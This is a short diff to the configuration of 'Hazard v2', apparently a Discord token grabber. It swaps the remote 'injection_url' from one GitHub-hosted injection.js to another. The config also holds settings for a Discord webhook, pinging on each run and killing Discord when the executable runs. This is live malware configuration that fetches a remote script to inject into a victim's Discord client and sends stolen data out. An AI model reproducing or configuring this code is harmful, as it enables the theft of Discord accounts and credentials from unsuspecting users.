@@ -32,7 +32,7 @@ __config__ = {
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     "webhook_protector_key": "KEY_HERE",
     # keep it as it is unless you want to have a custom one
-    "injection_url": "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/data/injection.js",
+    "injection_url": "https://raw.githubusercontent.com/Prize-app/Hazard/main/injection.js",
     # if True, it will ping @everyone when someone ran Hazard v2
     "ping_on_run": False,
     # set to False if you don't want it to kill programs such as discord upon running the exe
